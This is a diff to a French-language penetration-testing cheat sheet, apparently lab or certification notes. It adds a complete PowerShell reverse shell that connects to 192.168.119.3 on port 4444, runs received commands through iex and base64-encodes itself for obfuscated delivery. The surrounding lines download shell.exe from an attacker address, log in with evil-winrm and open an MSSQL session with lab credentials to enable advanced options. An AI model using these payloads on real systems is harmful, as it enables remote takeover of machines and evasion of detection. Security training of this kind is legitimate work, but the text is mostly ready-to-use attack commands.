@@ -19,7 +19,15 @@ Ou alors: (new-object System.Net.WebClient).DownloadFile('http://[IP]/shell.exe'
 ## Connexion a Windows Management (port 5985 par défaut) :
 •	evil-winrm -i [IP] -u [USER]  
 
-## Executer des commandes via MSQL :
+## Commande powershell offusquée:
+pwsh  
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'  
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)  
+$EncodedText =[Convert]::ToBase64String($Bytes)  
+$EncodedText  
+exit  
+
+## Executer des commandes via MSQL :  
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth  
 EXECUTE sp_configure 'show advanced options', 1;  
 RECONFIGURE;  
